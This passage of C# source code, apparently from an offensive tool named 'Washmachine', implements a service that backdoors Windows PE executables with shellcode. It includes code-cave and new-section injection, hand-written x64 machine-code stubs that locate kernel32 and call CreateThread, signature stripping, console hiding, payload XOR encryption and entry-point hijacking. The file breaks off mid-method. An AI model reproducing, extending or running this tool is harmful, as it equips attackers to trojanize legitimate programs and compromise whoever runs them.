using System.Text;
using Washmachine.Logging;
using Washmachine.Models;

namespace Washmachine.Services;

/// <summary>
/// Service for backdooring PE files by injecting shellcode.
/// Supports code cave injection, new section injection, and section extension.
/// Inspired by BDF-ng PE injection techniques, ported to C#.
/// </summary>
public sealed class PeBackdoorService
{
    // ── PE format constants ──────────────────────────────────────────────
    private const ushort IMAGE_DOS_SIGNATURE = 0x5A4D;
    private const uint IMAGE_NT_SIGNATURE = 0x00004550;
    private const ushort IMAGE_FILE_MACHINE_AMD64 = 0x8664;
    private const ushort IMAGE_FILE_MACHINE_I386 = 0x014c;
    private const ushort IMAGE_FILE_DLL = 0x2000;

    private const uint IMAGE_SCN_MEM_EXECUTE     = 0x20000000;
    private const uint IMAGE_SCN_MEM_READ        = 0x40000000;
    private const uint IMAGE_SCN_MEM_WRITE       = 0x80000000;
    private const uint IMAGE_SCN_CNT_CODE        = 0x00000020;
    private const uint IMAGE_SCN_MEM_DISCARDABLE = 0x02000000;

    private const ushort IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE = 0x0040;
    private const ushort IMAGE_SUBSYSTEM_WINDOWS_GUI = 2;

    // ── Metasploit ROR13 API hash constants (block_api.asm) ──────────────
    // Precomputed using the Metasploit ROR13 algorithm with MaximumLength
    // (UTF-16LE module name + 2 null bytes). Used to detect and patch
    // shellcode that calls process-killing exit functions.
    private const uint MSF_HASH_EXIT_PROCESS                  = 0x56A2B5F0;
    private const uint MSF_HASH_EXIT_THREAD                   = 0x0A2A1DE0;
    private const uint MSF_HASH_RTL_EXIT_USER_THREAD          = 0x6F721347;
    private const uint MSF_HASH_SET_UNHANDLED_EXCEPTION_FILTER = 0xEA320EFE;
    private const uint MSF_HASH_TERMINATE_PROCESS             = 0x5ECADC87;
    private const uint MSF_HASH_NT_TERMINATE_PROCESS          = 0x1E35E09C;
    private const uint MSF_HASH_RTL_EXIT_USER_PROCESS         = 0xAA1B814D;
    private const uint MSF_HASH_GET_VERSION                   = 0x9DBD95A6;

    // ── x64 register save/restore stubs ──────────────────────────────────
    // 16 pushes (15 GPRs + pushfq) = 128 bytes = 0 mod 16.
    // sub rsp must also be 0 mod 16 so total stack movement is 0 mod 16,
    // ensuring CALL to shellcode enters with RSP = 8 mod 16 (standard ABI).
    // Save: push rax..rdi, push r8..r15, pushfq, sub rsp 0x20  (28 bytes)
    private static readonly byte[] X64SaveRegs = {
        0x50, 0x51, 0x52, 0x53, 0x55, 0x56, 0x57,          // push rax-rdi (skip rsp)
        0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53,    // push r8-r11
        0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57,    // push r12-r15
        0x9C,                                                // pushfq
        0x48, 0x83, 0xEC, 0x20                               // sub rsp, 0x20 (shadow space, 16-aligned)
    };

    // Restore: add rsp 0x20, popfq, pop r15..r8, pop rdi..rax  (28 bytes)
    private static readonly byte[] X64RestoreRegs = {
        0x48, 0x83, 0xC4, 0x20,                              // add rsp, 0x20
        0x9D,                                                 // popfq
        0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C,     // pop r15-r12
        0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58,     // pop r11-r8
        0x5F, 0x5E, 0x5D, 0x5B, 0x5A, 0x59, 0x58            // pop rdi-rax
    };

    // Locate kernel32 by walking the first few loaded modules from the PEB.
    // This is used by compatibility wrappers for shellcode that assumes RBX
    // already points at kernel32 before it starts parsing exports.
    private static readonly byte[] X64Kernel32PebWalk = {
        0x48, 0x31, 0xC9,                                     // xor rcx, rcx
        0x65, 0x48, 0x8B, 0x41, 0x60,                         // mov rax, gs:[rcx+0x60] (PEB)
        0x48, 0x8B, 0x40, 0x18,                               // mov rax, [rax+0x18]    (Ldr)
        0x48, 0x8B, 0x70, 0x20,                               // mov rsi, [rax+0x20]    (InMemOrderModuleList)
        0x48, 0xAD,                                           // lodsq                  (skip exe)
        0x48, 0x96,                                           // xchg rax, rsi
        0x48, 0xAD,                                           // lodsq                  (skip ntdll)
        0x48, 0x8B, 0x58, 0x20                                // mov rbx, [rax+0x20]    (kernel32 DllBase)
    };

    // x86 save/restore
    private static readonly byte[] X86SaveRegs  = { 0x60, 0x9C }; // pushad, pushfd
    private static readonly byte[] X86RestoreRegs = { 0x9D, 0x61 }; // popfd, popad

    // ── Internal PE parsing result ───────────────────────────────────────
    private sealed class ParsedPe
    {
        public uint PeOffset;
        public bool Is64Bit;
        public bool IsDll;
        public bool IsDotNet;
        public bool HasSignature;
        public bool HasAslr;

        public ushort Machine;
        public ushort NumberOfSections;
        public ushort SizeOfOptionalHeader;
        public ushort Characteristics;

        public uint AddressOfEntryPoint;
        public ulong ImageBase;
        public uint SectionAlignment;
        public uint FileAlignment;
        public uint SizeOfImage;
        public uint SizeOfHeaders;
        public uint Checksum;
        public ushort Subsystem;
        public ushort DllCharacteristics;

        // File offsets of key fields (for patching)
        public long NumberOfSectionsFileOffset;
        public long EntryPointFieldFileOffset;
        public long SizeOfImageFieldFileOffset;
        public long ChecksumFieldFileOffset;
        public long SubsystemFieldFileOffset;
        public long SecurityDirFileOffset;   // file offset of Security data directory entry
        public long SectionHeadersFileOffset;

        // Calculated
        public long EntryPointCodeFileOffset; // file offset where entry point code lives

        public List<SectionEntry> Sections = new();
    }

    private sealed class SectionEntry
    {
        public string Name = "";
        public uint VirtualSize;
        public uint VirtualAddress;
        public uint RawSize;
        public uint RawAddress;
        public uint Characteristics;
        public long HeaderFileOffset; // file offset of this section header (for patching)

        public bool IsExecutable => (Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        public bool IsReadable    => (Characteristics & IMAGE_SCN_MEM_READ) != 0;
        public bool IsWritable    => (Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
    }

    private sealed class CaveInfo
    {
        public string SectionName = "";
        public int SectionIndex;
        public long FileOffset;
        public uint Rva;
        public int Size;
        public byte FillByte;
        public bool SectionIsExecutable;
    }

    private readonly IAppLogger _logger;
    private readonly IAppPaths _paths;

    public PeBackdoorService(IAppPaths paths, IAppLogger logger)
    {
        _paths = paths ?? throw new ArgumentNullException(nameof(paths));
        _logger = logger ?? throw new ArgumentNullException(nameof(logger));
    }

    // ═════════════════════════════════════════════════════════════════════
    //  Public API
    // ═════════════════════════════════════════════════════════════════════

    /// <summary>Analyze a PE file and return basic information.</summary>
    public async Task<PeInfo> AnalyzePeAsync(string filePath)
    {
        if (!File.Exists(filePath))
            throw new FileNotFoundException("PE file not found", filePath);
        return await Task.Run(() =>
        {
            var data = File.ReadAllBytes(filePath);
            var pe = ParsePe(data);
            return ToPeInfo(pe, filePath, data.Length);
        });
    }

    /// <summary>Find code caves in a PE file.</summary>
    public async Task<List<CodeCave>> FindCodeCavesAsync(string filePath, int minSize = 50)
    {
        return await Task.Run(() =>
        {
            var data = File.ReadAllBytes(filePath);
            var pe = ParsePe(data);
            return ScanForCaves(data, pe, minSize)
                .Select(c => new CodeCave
                {
                    SectionName = c.SectionName,
                    FileOffset = (uint)c.FileOffset,
                    VirtualAddress = c.Rva,
                    Size = (uint)c.Size
                })
                .ToList();
        });
    }

    /// <summary>Backdoor a PE file with shellcode.</summary>
    public async Task<BackdoorResult> BackdoorAsync(PeBackdoorOptions options)
    {
        var result = new BackdoorResult();
        try
        {
            // ── Validate inputs ──────────────────────────────────────
            if (!File.Exists(options.TargetPePath))
            {
                result.ErrorMessage = $"Target PE file not found: {options.TargetPePath}";
                return result;
            }
            // Dropper mode uses an implant EXE rather than raw shellcode.
            byte[] shellcode;
            if (options.Mode == BackdoorMode.Dropper)
            {
                shellcode = Array.Empty<byte>();
            }
            else
            {
                if (!File.Exists(options.ShellcodePath))
                {
                    result.ErrorMessage = $"Shellcode file not found: {options.ShellcodePath}";
                    return result;
                }
                shellcode = await File.ReadAllBytesAsync(options.ShellcodePath);
                if (shellcode.Length == 0)
                {
                    result.ErrorMessage = "Shellcode file is empty";
                    return result;
                }
                result.ShellcodeSize = shellcode.Length;
                result.Steps.Add($"Loaded shellcode: {shellcode.Length} bytes from {Path.GetFileName(options.ShellcodePath)}");
                _logger.Info($"Loaded shellcode: {shellcode.Length} bytes");
            }

            // ── Parse PE ─────────────────────────────────────────────
            var peData = await File.ReadAllBytesAsync(options.TargetPePath);
            var pe = ParsePe(peData);
            result.Steps.Add($"Parsed PE: {(pe.Is64Bit ? "x64" : "x86")} {(pe.IsDll ? "DLL" : "EXE")}, {pe.NumberOfSections} sections");
            _logger.Info($"Target: {(pe.Is64Bit ? "x64" : "x86")} {(pe.IsDll ? "DLL" : "EXE")}");

            // Dropper mode has its own injection pipeline — bypass shellcode validation.
            if (options.Mode == BackdoorMode.Dropper)
                return await BackdoorDropperAsync(options, peData, pe, result);

            // ── Pre-flight validation ────────────────────────────────
            var issues = ValidateForInjection(pe, shellcode, options);
            foreach (var issue in issues)
            {
                if (issue.StartsWith("BLOCK:"))
                {
                    result.ErrorMessage = issue[6..].Trim();
                    result.Warnings.AddRange(issues.Where(i => !i.StartsWith("BLOCK:")));
                    return result;
                }
                result.Warnings.Add(issue);
                _logger.Warn(issue);
            }

            // ── Strip signature overlay BEFORE injection ─────────────
            // Signed PEs have signature data (overlay) appended AFTER the last
            // section. new-section and section-ext write there, so we must
            // truncate the overlay first to avoid corruption.
            if (pe.HasSignature && options.RemoveSignature)
            {
                peData = StripSignatureOverlay(peData, pe);
                pe = ParsePe(peData);
                result.Steps.Add($"Stripped signature overlay (file now {peData.Length:N0} bytes)");
            }

            // ── Patch exit functions for thread safety ────────────────
            if (options.PatchExitCalls)
            {
                int patchCount;
                (shellcode, patchCount) = PatchShellcodeExitCalls(shellcode, pe.Is64Bit);
                if (patchCount > 0)
                    result.Steps.Add($"Patched {patchCount} destructive exit call(s) → ExitThread for thread safety");
            }

            // ── Encrypt shellcode if requested ───────────────────────
            byte[] payload = shellcode;
            if (options.Encryption != PayloadEncryption.None)
            {
                payload = EncryptPayload(shellcode, options);
                result.Steps.Add($"Encrypted payload with {options.Encryption} ({payload.Length} bytes)");
            }

            // ── Build injection payload ──────────────────────────────
            // Normal mode: host and implant both run every launch — warn about persistence.
            if (options.Mode == BackdoorMode.Normal)
                result.Warnings.Add("Normal mode: host binary and implant both execute on every launch — incompatible with persistence snippets.");

            bool isTlsCarrier = options.CarrierInvoke == CarrierInvoke.TlsCallback;
            bool isFunctionBackdoor = options.CarrierInvoke == CarrierInvoke.EntryFunctionBackdoor;

            // For function backdoor: capture the original 5 bytes at the entry point
            // BEFORE any modification so we can embed them in the carrier as a trampoline.
            byte[]? originalEntryBytes = null;
            if (isFunctionBackdoor && pe.Is64Bit && options.Encryption == PayloadEncryption.None)
            {
                originalEntryBytes = new byte[5];
                Array.Copy(peData, pe.EntryPointCodeFileOffset, originalEntryBytes, 0, 5);
                result.Steps.Add($"Saved original entry bytes: {string.Join(" ", originalEntryBytes.Select(b => b.ToString("X2")))}");
            }

            // Use threaded payload (CreateThread) for x64 to handle shellcode that
            // calls ExitProcess or never returns (reverse shells, etc).
            // Silence mode uses a command-line check to suppress the host when args are present.
            // Falls back to inline CALL for x86.
            int jmpOffsetInPayload;
            byte[] fullPayload;
            if (isTlsCarrier)
            {
                // TLS carrier: payload must RETURN (C3) so the loader can call OEP afterwards
                fullPayload = BuildThreadedPayload(payload, pe.Is64Bit, out jmpOffsetInPayload, tlsMode: true);
                int stubOverhead = fullPayload.Length - payload.Length;
                result.Steps.Add($"Built TLS callback payload: {fullPayload.Length} bytes ({payload.Length} shellcode + {stubOverhead} stub)");
            }
            else if (isFunctionBackdoor && originalEntryBytes != null)
            {
                // Function backdoor: append original 5 entry bytes before the JMP so they
                // are re-executed in place of the patched entry, then JMP to OEP+5.
                fullPayload = BuildThreadedPayload(payload, pe.Is64Bit, out jmpOffsetInPayload,
                    extraBeforeTerminator: originalEntryBytes);
                int stubOverhead = fullPayload.Length - payload.Length;
                result.Steps.Add($"Built function-backdoor payload: {fullPayload.Length} bytes ({payload.Length} shellcode + {stubOverhead} stub, {originalEntryBytes.Length} trampoline bytes)");
            }
            else if (pe.Is64Bit && options.Encryption == PayloadEncryption.None)
            {
                if (options.Mode == BackdoorMode.Silence)
                {
                    fullPayload = BuildSilencePayload(payload, out jmpOffsetInPayload);
                    int stubOverhead = fullPayload.Length - payload.Length;
                    result.Steps.Add($"Built silence payload: {fullPayload.Length} bytes ({payload.Length} shellcode + {stubOverhead} stub)");
                }
                else
                {
                    fullPayload = BuildThreadedPayload(payload, pe.Is64Bit, out jmpOffsetInPayload);
                    int stubOverhead = fullPayload.Length - payload.Length;
                    result.Steps.Add($"Built threaded payload: {fullPayload.Length} bytes ({payload.Length} shellcode + {stubOverhead} stub)");
                }
            }
            else
            {
                // Inline CALL payload (x86, or when encryption requires inline decoder)
                fullPayload = BuildInlinePayload(payload, pe.Is64Bit, options.Encryption, options.XorKey);
                int stubOverhead = fullPayload.Length - payload.Length;
                jmpOffsetInPayload = -1; // let PatchPayloadJmpOffset auto-detect
                result.Steps.Add($"Built injection payload: {fullPayload.Length} bytes ({payload.Length} shellcode + {stubOverhead} stub)");
            }

            // ── Inject ───────────────────────────────────────────────
            uint payloadRva;
            // TLS carrier always uses TLS injection regardless of the selected method,
            // because it needs a full TLS directory + callback array set up.
            if (isTlsCarrier)
            {
                string tlsSectionName = string.IsNullOrEmpty(options.NewSectionName) ? ".tls0" : options.NewSectionName;
                (peData, payloadRva) = InjectViaTlsCallback(peData, pe, fullPayload, tlsSectionName, result);
                pe = ParsePe(peData);
            }
            else
            {
                switch (options.Method)
                {
                    case InjectionMethod.CodeCave:
                        (peData, payloadRva) = InjectCodeCave(peData, pe, fullPayload, result);
                        break;
                    case InjectionMethod.NewSection:
                        (peData, payloadRva) = InjectNewSection(peData, pe, fullPayload, options.NewSectionName, result);
                        // Re-parse after structural change
                        pe = ParsePe(peData);
                        break;
                    case InjectionMethod.SectionExtension:
                        (peData, payloadRva) = InjectSectionExtension(peData, pe, fullPayload, result);
                        pe = ParsePe(peData);
                        break;
                    case InjectionMethod.TextSectionPadding:
                        (peData, payloadRva) = InjectTextSectionPadding(peData, pe, fullPayload, result);
                        break;
                    case InjectionMethod.TlsCallback:
                        (peData, payloadRva) = InjectViaTlsCallback(peData, pe, fullPayload, options.NewSectionName, result);
                        pe = ParsePe(peData);
                        break;
                    default:
                        result.ErrorMessage = $"Injection method {options.Method} is not supported";
                        return result;
                }
            }

            result.ShellcodeAddress = payloadRva;
            result.CarrierAddress = payloadRva;

            // ── Carrier-specific post-injection patching ─────────────
            if (isTlsCarrier)
            {
                // TLS callback: payload ends with RET (C3), so no JMP to patch.
                // PE header entry point is intentionally left unchanged — the loader
                // runs TLS callbacks before calling OEP, so OEP fires on its own.
                result.Steps.Add($"TLS callback installed: payload at RVA 0x{payloadRva:X}, OEP preserved at 0x{pe.AddressOfEntryPoint:X}");
                _logger.Info($"TLS carrier: payload at RVA 0x{payloadRva:X}, OEP 0x{pe.AddressOfEntryPoint:X} unchanged");
            }
            else if (isFunctionBackdoor)
            {
                // Function backdoor: patch JMP in payload to OEP+5 (skipping the 5 bytes
                // we overwrote with our own JMP), then patch those 5 entry bytes → JMP carrier.
                uint resumeRva = pe.AddressOfEntryPoint + 5;
                peData = PatchPayloadJmpOffset(peData, pe, fullPayload.Length, payloadRva, jmpOffsetInPayload, resumeRva);
                result.Steps.Add($"Patched resume JMP → OEP+5 (0x{resumeRva:X})");

                peData = PatchEntryFunctionWithJmp(peData, pe, payloadRva, result);
            }
            else
            {
                // EntryPointHijack / DllMain: standard path — patch JMP to OEP and
                // redirect AddressOfEntryPoint to the carrier.
                peData = PatchPayloadJmpOffset(peData, pe, fullPayload.Length, payloadRva, jmpOffsetInPayload);
                result.Steps.Add($"Patched resume JMP → original entry point 0x{pe.AddressOfEntryPoint:X}");

                peData = PatchEntryPointField(peData, pe, payloadRva);
                result.Steps.Add($"Entry point: 0x{pe.AddressOfEntryPoint:X} → 0x{payloadRva:X}");
                _logger.Info($"Entry point changed: 0x{pe.AddressOfEntryPoint:X} → 0x{payloadRva:X}");
            }

            // ── Post-processing ──────────────────────────────────────
            if (options.RemoveSignature && pe.HasSignature)
            {
                // Signature dir entry still set — zero it
                peData = RemoveSignatureInternal(peData, pe);
                result.Steps.Add("Zeroed signature directory entry");
            }

            if (options.PatchSubsystemToGui && !pe.IsDll)
            {
                peData = PatchSubsystemInternal(peData, pe);
                result.Steps.Add("Patched subsystem to GUI (hidden console)");
            }

            peData = RecalculateChecksum(peData, pe);
            result.Steps.Add("Recalculated PE checksum");

            // ── Verify output PE ─────────────────────────────────────
            try
            {
                var verifyPe = ParsePe(peData);
                // TLS carrier and function backdoor intentionally leave OEP unchanged
                if (!isTlsCarrier && !isFunctionBackdoor && verifyPe.AddressOfEntryPoint != payloadRva)
                    result.Warnings.Add($"Verification: entry point mismatch (expected 0x{payloadRva:X}, got 0x{verifyPe.AddressOfEntryPoint:X})");
            }
            catch (Exception ex)
            {
                result.Warnings.Add($"Post-injection PE verification failed: {ex.Message}");
            }

            // ── Write output ─────────────────────────────────────────
            var outputPath = options.OutputPath;
            if (string.IsNullOrEmpty(outputPath))
            {
                var dir = Path.GetDirectoryName(options.TargetPePath)!;
                var name = Path.GetFileNameWithoutExtension(options.TargetPePath);
                var ext = Path.GetExtension(options.TargetPePath);
                outputPath = Path.Combine(dir, $"{name}.backdoored{ext}");
            }

            var outDir = Path.GetDirectoryName(outputPath);
            if (!string.IsNullOrEmpty(outDir) && !Directory.Exists(outDir))
                Directory.CreateDirectory(outDir);

            await File.WriteAllBytesAsync(outputPath, peData);
            result.OutputPath = outputPath;
            result.Success = true;
            result.Steps.Add($"Output: {outputPath} ({peData.Length:N0} bytes)");
            _logger.Ok($"Backdoored PE written to: {outputPath}");

            return result;
        }
        catch (Exception ex)
        {
            result.ErrorMessage = ex.Message;
            _logger.Error($"Backdooring failed: {ex.Message}");
            return result;
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    //  PE Parsing
    // ═════════════════════════════════════════════════════════════════════

    private ParsedPe ParsePe(byte[] data)
    {
        if (data.Length < 64)
            throw new InvalidDataException("File too small to be a valid PE");

        var pe = new ParsedPe();
        using var ms = new MemoryStream(data);
        using var br = new BinaryReader(ms);

        // DOS header
        if (br.ReadUInt16() != IMAGE_DOS_SIGNATURE)
            throw new InvalidDataException("Invalid DOS signature (not MZ)");

        ms.Seek(0x3C, SeekOrigin.Begin);
        pe.PeOffset = br.ReadUInt32();

        if (pe.PeOffset + 4 > data.Length)
            throw new InvalidDataException("PE header offset points beyond file");

        // PE signature
        ms.Seek(pe.PeOffset, SeekOrigin.Begin);
        if (br.ReadUInt32() != IMAGE_NT_SIGNATURE)
            throw new InvalidDataException("Invalid PE signature");

        // ── File header (20 bytes) ───────────────────────────────────
        long fileHeaderOffset = pe.PeOffset + 4;

        pe.Machine = br.ReadUInt16();
        pe.Is64Bit = pe.Machine == IMAGE_FILE_MACHINE_AMD64;

        pe.NumberOfSectionsFileOffset = ms.Position;
        pe.NumberOfSections = br.ReadUInt16();

        br.ReadUInt32(); // TimeDateStamp
        br.ReadUInt32(); // PointerToSymbolTable
        br.ReadUInt32(); // NumberOfSymbols
        pe.SizeOfOptionalHeader = br.ReadUInt16();
        pe.Characteristics = br.ReadUInt16();
        pe.IsDll = (pe.Characteristics & IMAGE_FILE_DLL) != 0;

        // ── Optional header ──────────────────────────────────────────
        long optHeaderOffset = fileHeaderOffset + 20;
        ms.Seek(optHeaderOffset, SeekOrigin.Begin);
        ushort magic = br.ReadUInt16();

        // Skip linker version (2 bytes)
        br.ReadUInt16();
        // Skip SizeOfCode, SizeOfInitializedData, SizeOfUninitializedData (12 bytes)
        br.ReadUInt32(); br.ReadUInt32(); br.ReadUInt32();

        // AddressOfEntryPoint at optional header offset 16
        pe.EntryPointFieldFileOffset = ms.Position;
        pe.AddressOfEntryPoint = br.ReadUInt32();

        br.ReadUInt32(); // BaseOfCode

        if (pe.Is64Bit)
        {
            pe.ImageBase = br.ReadUInt64();
        }
        else
        {
            br.ReadUInt32(); // BaseOfData (PE32 only)
            pe.ImageBase = br.ReadUInt32();
        }

        // SectionAlignment, FileAlignment at optional header offsets 32, 36
        pe.SectionAlignment = br.ReadUInt32();
        pe.FileAlignment = br.ReadUInt32();

        // Skip OS/Image/Subsystem versions + Win32VersionValue (16 bytes: 6×2 + 1×4)
        br.ReadBytes(16);

        // SizeOfImage at optional header offset 56
        pe.SizeOfImageFieldFileOffset = ms.Position;
        pe.SizeOfImage = br.ReadUInt32();

        pe.SizeOfHeaders = br.ReadUInt32();

        // Checksum at optional header offset 64
        pe.ChecksumFieldFileOffset = ms.Position;
        pe.Checksum = br.ReadUInt32();

        // Subsystem at optional header offset 68
        pe.SubsystemFieldFileOffset = ms.Position;
        pe.Subsystem = br.ReadUInt16();

        pe.DllCharacteristics = br.ReadUInt16();
        pe.HasAslr = (pe.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) != 0;

        // Data directories: Security is index 4
        // PE32:  data dirs start at optHeader + 96, Security at +128
        // PE32+: data dirs start at optHeader + 112, Security at +144
        long securityDirOffset = optHeaderOffset + (pe.Is64Bit ? 144 : 128);
        pe.SecurityDirFileOffset = securityDirOffset;
        ms.Seek(securityDirOffset, SeekOrigin.Begin);
        uint secRva = br.ReadUInt32();
        uint secSize = br.ReadUInt32();
        pe.HasSignature = secSize > 0;

        // COM Descriptor (index 14): .NET detection
        long comDirOffset = optHeaderOffset + (pe.Is64Bit ? 224 : 208);
        ms.Seek(comDirOffset, SeekOrigin.Begin);
        uint comRva = br.ReadUInt32();
        uint comSize = br.ReadUInt32();
        pe.IsDotNet = comSize > 0;

        // ── Section headers ──────────────────────────────────────────
        pe.SectionHeadersFileOffset = optHeaderOffset + pe.SizeOfOptionalHeader;
        ms.Seek(pe.SectionHeadersFileOffset, SeekOrigin.Begin);

        for (int i = 0; i < pe.NumberOfSections; i++)
        {
            long hdrOffset = ms.Position;
            var nameBytes = br.ReadBytes(8);
            var section = new SectionEntry
            {
                Name = Encoding.ASCII.GetString(nameBytes).TrimEnd('\0'),
                VirtualSize = br.ReadUInt32(),
                VirtualAddress = br.ReadUInt32(),
                RawSize = br.ReadUInt32(),
                RawAddress = br.ReadUInt32(),
                HeaderFileOffset = hdrOffset,
            };
            br.ReadBytes(12); // Relocations, Linenumbers
            section.Characteristics = br.ReadUInt32();
            pe.Sections.Add(section);
        }

        // Calculate entry point file offset
        pe.EntryPointCodeFileOffset = RvaToFileOffset(pe.AddressOfEntryPoint, pe.Sections);

        return pe;
    }

    // ═════════════════════════════════════════════════════════════════════
    //  Code Cave Scanning
    // ═════════════════════════════════════════════════════════════════════

    private List<CaveInfo> ScanForCaves(byte[] data, ParsedPe pe, int minSize)
    {
        var caves = new List<CaveInfo>();

        for (int si = 0; si < pe.Sections.Count; si++)
        {
            var section = pe.Sections[si];
            if (section.RawSize == 0 || section.RawAddress + section.RawSize > data.Length)
                continue;

            int start = (int)section.RawAddress;
            int end = start + (int)section.RawSize;

            int caveStart = -1;
            byte caveByte = 0;
            int caveLen = 0;

            for (int i = start; i < end; i++)
            {
                byte b = data[i];
                if (b == 0x00 || b == 0xCC)
                {
                    if (caveStart == -1)
                    {
                        caveStart = i;
                        caveByte = b;
                        caveLen = 1;
                    }
                    else if (b == caveByte || b == 0x00)
                    {
                        caveLen++;
                    }
                    else
                    {
                        // Different fill byte, flush and start new
                        if (caveLen >= minSize)
                            AddCave(caves, section, si, caveStart, caveLen, caveByte);
                        caveStart = i;
                        caveByte = b;
                        caveLen = 1;
                    }
                }
                else
                {
                    if (caveLen >= minSize)
                        AddCave(caves, section, si, caveStart, caveLen, caveByte);
                    caveStart = -1;
                    caveLen = 0;
                }
            }

            if (caveLen >= minSize)
                AddCave(caves, section, si, caveStart, caveLen, caveByte);
        }

        return caves.OrderByDescending(c => c.Size).ToList();
    }

    private static void AddCave(List<CaveInfo> list, SectionEntry section, int sectionIdx,
                                int fileOffset, int size, byte fillByte)
    {
        int offsetInSection = fileOffset - (int)section.RawAddress;
        list.Add(new CaveInfo
        {
            SectionName = section.Name,
            SectionIndex = sectionIdx,
            FileOffset = fileOffset,
            Rva = section.VirtualAddress + (uint)offsetInSection,
            Size = size,
            FillByte = fillByte,
            SectionIsExecutable = section.IsExecutable,
        });
    }

    // ═════════════════════════════════════════════════════════════════════
    //  Payload Building
    // ═════════════════════════════════════════════════════════════════════

    /// <summary>
    /// Build inline injection payload:
    ///   [save regs] [CALL shellcode] [restore regs] [JMP oep] [shellcode]
    /// The JMP offset is set to 0 and must be patched after placement.
    /// </summary>
    private byte[] BuildInlinePayload(byte[] shellcode, bool is64Bit,
                                       PayloadEncryption encryption = PayloadEncryption.None,
                                       byte xorKey = 0x42)
    {
        var buf = new List<byte>();

        byte[] saveRegs = is64Bit ? X64SaveRegs : X86SaveRegs;
        byte[] restoreRegs = is64Bit ? X64RestoreRegs : X86RestoreRegs;

        // [save regs]
        buf.AddRange(saveRegs);

        // XOR decoder stub (if encrypted)
        int decoderSize = 0;
        if (encryption == PayloadEncryption.Xor)
        {
            var decoder = BuildXorDecoderStub(is64Bit, shellcode.Length, xorKey);
            buf.AddRange(decoder);
            decoderSize = decoder.Length;
        }

        // [CALL shellcode] - E8 + 4-byte relative offset
        // The offset jumps over: restore + jmp = restoreRegs.Length + 5
        int callOffset = restoreRegs.Length + 5; // skip restore + jmp to reach shellcode
        buf.Add(0xE8);
        buf.AddRange(BitConverter.GetBytes(callOffset));

        // [restore regs]
        buf.AddRange(restoreRegs);

        // [JMP original_entry_point] - E9 + 4-byte offset (patched later)
        buf.Add(0xE9);
        buf.AddRange(new byte[4]); // placeholder, patched by PatchPayloadJmpOffset

        // [shellcode bytes]
        buf.AddRange(shellcode);

        return buf.ToArray();
    }

    /// <summary>
     /// Build a threaded injection payload that runs shellcode in a new thread via CreateThread.
     /// This allows the original program to continue running even if the shellcode never returns
     /// or calls ExitProcess (which is patched to ExitThread).
    /// Layout: [save regs] [PEB walk + CreateThread(shellcode)] [restore regs] [JMP oep] [shellcode]
     /// The JMP offset is set to 0 and must be patched after placement.
     /// x64 only — falls back to inline payload for x86.
     /// </summary>
    private byte[] BuildThreadedPayload(byte[] shellcode, bool is64Bit, out int jmpOffsetInPayload,
        bool tlsMode = false, byte[]? extraBeforeTerminator = null)
    {
        if (!is64Bit)
        {
            // x86 threaded stub not implemented — fall back to inline
            var inline = BuildInlinePayload(shellcode, is64Bit);
            // JMP is at: save(2) + call(5) + restore(2) = 9
            jmpOffsetInPayload = X86SaveRegs.Length + 5 + X86RestoreRegs.Length;
            return inline;
        }

        var buf = new List<byte>();

        // ═══ [Save registers] ═══════════════════════════════════════════
        buf.AddRange(X64SaveRegs); // 28 bytes

        // ═══ [PEB walk: find kernel32 base] ═════════════════════════════ (26 bytes)
        buf.AddRange(X64Kernel32PebWalk);

        // ═══ [Export directory parse] ═══════════════════════════════════ (16 bytes)
        buf.AddRange(new byte[] { 0x8B, 0x43, 0x3C });                         // mov eax, [rbx+0x3C]    (e_lfanew)
        buf.AddRange(new byte[] { 0x48, 0x01, 0xD8 });                         // add rax, rbx           (PE header VA)
        buf.AddRange(new byte[] { 0x44, 0x8B, 0xA0, 0x88, 0x00, 0x00, 0x00 }); // mov r12d, [rax+0x88]  (Export Dir RVA)
        buf.AddRange(new byte[] { 0x49, 0x01, 0xDC });                         // add r12, rbx           (Export Dir VA)

        // ═══ [Export name search setup] ═════════════════════════════════ (16 bytes)
        buf.AddRange(new byte[] { 0x41, 0x8B, 0x4C, 0x24, 0x18 });             // mov ecx, [r12+0x18]    (NumberOfNames)
        buf.AddRange(new byte[] { 0x45, 0x8B, 0x54, 0x24, 0x20 });             // mov r10d, [r12+0x20]   (AddressOfNames RVA)
        buf.AddRange(new byte[] { 0x49, 0x01, 0xDA });                         // add r10, rbx           (AddressOfNames VA)
        buf.AddRange(new byte[] { 0x45, 0x31, 0xDB });                         // xor r11d, r11d         (index = 0)

        // ═══ [Search loop for "CreateThread"] ═══════════════════════════
        int searchLoopPos = buf.Count;
        buf.AddRange(new byte[] { 0x43, 0x8B, 0x34, 0x9A });                   // mov esi, [r10+r11*4]   (name RVA)
        buf.AddRange(new byte[] { 0x48, 0x01, 0xDE });                         // add rsi, rbx           (name VA)
        buf.AddRange(new byte[] { 0x81, 0x3E, 0x43, 0x72, 0x65, 0x61 });       // cmp dword [rsi], "Crea"
        int jneNext1 = buf.Count;
        buf.AddRange(new byte[] { 0x75, 0x00 });                               // jne next_name (patch later)
        buf.AddRange(new byte[] { 0x81, 0x7E, 0x04, 0x74, 0x65, 0x54, 0x68 }); // cmp dword [rsi+4], "teTh"
        int jneNext2 = buf.Count;
        buf.AddRange(new byte[] { 0x75, 0x00 });                               // jne next_name (patch later)
        buf.AddRange(new byte[] { 0x81, 0x7E, 0x08, 0x72, 0x65, 0x61, 0x64 }); // cmp dword [rsi+8], "read"
        int jneNext3 = buf.Count;
        buf.AddRange(new byte[] { 0x75, 0x00 });                               // jne next_name (patch later)
        buf.AddRange(new byte[] { 0x80, 0x7E, 0x0C, 0x00 });                   // cmp byte [rsi+12], 0
        int jneNext4 = buf.Count;
        buf.AddRange(new byte[] { 0x75, 0x00 });                               // jne next_name (patch later)
        int jmpFound = buf.Count;
        buf.AddRange(new byte[] { 0xEB, 0x00 });                               // jmp found (patch later)

        // next_name:
        int nextNamePos = buf.Count;
        buf.AddRange(new byte[] { 0x41, 0xFF, 0xC3 });                         // inc r11d
        buf.AddRange(new byte[] { 0x41, 0x39, 0xCB });                         // cmp r11d, ecx
        int jlSearch = buf.Count;
